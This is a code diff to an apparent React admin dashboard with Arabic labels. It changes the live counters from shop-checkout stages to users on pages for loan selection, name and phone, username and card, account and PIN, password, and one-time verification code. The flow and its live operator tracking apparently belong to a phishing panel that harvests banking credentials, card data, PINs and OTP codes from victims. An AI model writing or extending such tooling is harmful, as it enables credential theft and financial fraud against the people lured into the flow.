@@ -30,45 +30,51 @@ function LiveStatCard({ icon, iconBg, value, label }) {
 }
 
 export default function AdminHayy() {
-  const { visitors, personal, delivery, payment, otp, connected, totalOrders, setupRequired } =
+  const { loanSelection, phone, username, account, password, otp, connected, totalOrders, setupRequired } =
     useNeighborhoodLiveStats()
 
   const cards = [
     {
       icon: '👥',
       iconBg: 'bg-emerald-100',
-      value: visitors,
-      label: 'زائر على الموقع الآن',
+      value: loanSelection,
+      label: 'صفحة اختيار القرض',
     },
     {
       icon: '🛍️',
       iconBg: 'bg-orange-100',
-      value: delivery,
-      label: 'يملؤون نموذج التوصيل',
+      value: phone,
+      label: 'صفحة الاسم ورقم الهاتف',
     },
     {
       icon: '👤',
       iconBg: 'bg-violet-100',
-      value: personal,
-      label: 'يملؤون البيانات الشخصية',
+      value: username,
+      label: 'صفحة اسم المستخدم والبطاقة',
     },
     {
       icon: '💳',
       iconBg: 'bg-amber-100',
-      value: payment,
-      label: 'يدخلون بيانات الدفع',
+      value: account,
+      label: 'صفحة الحساب والـ PIN',
     },
     {
       icon: '🔑',
       iconBg: 'bg-pink-100',
-      value: otp,
-      label: 'يدخلون رمز التحقق',
+      value: password,
+      label: 'صفحة كلمة المرور',
     },
     {
       icon: '📋',
       iconBg: 'bg-teal-100',
       value: totalOrders,
       label: 'إجمالي الطلبات',
+    },
+    {
+      icon: '🔑',
+      iconBg: 'bg-pink-100',
+      value: otp,
+      label: 'صفحة رمز التحقق (OTP)',
     },
   ]
 
